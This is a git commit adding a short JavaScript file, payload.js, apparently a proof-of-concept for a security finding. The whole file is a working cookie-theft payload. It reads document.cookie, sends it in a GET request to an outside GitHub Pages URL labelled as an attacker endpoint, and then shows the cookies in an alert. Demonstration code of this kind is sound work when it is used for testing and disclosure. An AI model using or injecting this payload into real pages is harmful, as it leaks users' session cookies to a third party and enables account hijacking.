0ce93aa1ab986c01b8bce5c13d23155b7d20008a
ESW1234 <speddi@salesforce.com>
2023-01-23 08:47:13 -0800

    Create payload.js

---
+++ ben/W-12276431/payload.js
@@ -0,0 +1,12 @@
+console.log('Cookies are being sent to attacker-controlled domain silently....');
+
+var xhr = new XMLHttpRequest();
+
+//send cookies to attacker endpoint
+
+xhr.open("GET", "https://esw1234.github.io/ben/W-12276431/leak.html?cookies="+document.cookie, false);
+
+xhr.send();
+
+alert(document.cookie);
+
